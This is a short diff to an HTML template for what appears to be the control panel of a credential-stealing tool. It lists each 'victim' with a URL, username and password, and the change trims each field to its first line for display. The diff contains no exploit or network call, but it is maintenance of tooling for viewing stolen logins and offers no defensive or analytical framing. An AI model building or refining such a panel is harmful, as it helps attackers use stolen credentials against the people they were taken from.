@@ -109,10 +109,10 @@
                     <div class="password-entries">
                         <div class="password-entry">
                             <div class="entry-info">
-                                <div class="url">Url :</div>
+                                <div class="url">Url : {{ victim.url.split('\n')[0] }}</div>
                                 <div class="credentials">
-                                    <span>Username : {{ victim.usernames }}</span>
-                                    <span>Password : {{ victim.passwords }}</span>
+                                    <span>Username : {{ victim.usernames.split('\n')[0] }}</span>
+                                    <span>Password : {{ victim.passwords.split('\n')[0] }}</span>
                                 </div>
                             </div>
                             <div class="entry-icon">🔒</div>
